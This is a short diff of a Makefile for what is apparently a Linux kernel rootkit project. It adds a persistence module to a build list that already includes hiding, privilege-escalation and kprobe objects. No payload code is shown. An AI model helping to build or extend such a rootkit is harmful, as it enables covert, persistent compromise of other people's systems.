@@ -28,6 +28,7 @@ $(ROOTKIT)-y += $(ROOTKIT_DIR)/hide.o
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/privesc.o
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/kprobe.o
 $(ROOTKIT)-y += $(ROOTKIT_DIR)/driver.o
+$(ROOTKIT)-y += $(ROOTKIT_DIR)/persistance.o
 
 # Client
 CLIENT_SRC := $(CLIENT_DIR)/main.c
